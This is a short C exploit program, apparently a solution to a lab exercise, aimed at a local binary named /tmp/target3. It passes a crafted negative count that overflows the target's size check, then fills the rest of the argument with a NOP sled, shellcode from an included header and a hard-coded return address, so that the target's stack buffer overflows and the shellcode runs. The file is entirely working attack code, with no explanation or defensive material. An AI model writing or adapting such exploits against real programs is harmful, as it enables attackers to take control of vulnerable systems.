#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[2581]; // 2560 buf + 11 count char + 1 comma + 4 stp + 4 ret addr + 1 null terminate
  char *count;
  count = "-2147483487"; // nag->overflow->pos=2572>2560
  
  memset(buf, 0x90, sizeof(buf));
  strncpy(buf, count, strlen(count));
  strncpy(buf+strlen(count), ",", 1);
  strncpy(buf+strlen(count)+1+2560-strlen(shellcode), shellcode, strlen(shellcode)); // shellcode
  strncpy(buf+strlen(count)+1+2560+4, "\x48\xea\xff\xbf", 4); // ret addr
  strncpy(buf+strlen(count)+1+2560+8+1, "\x00", 1); // null terminate

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
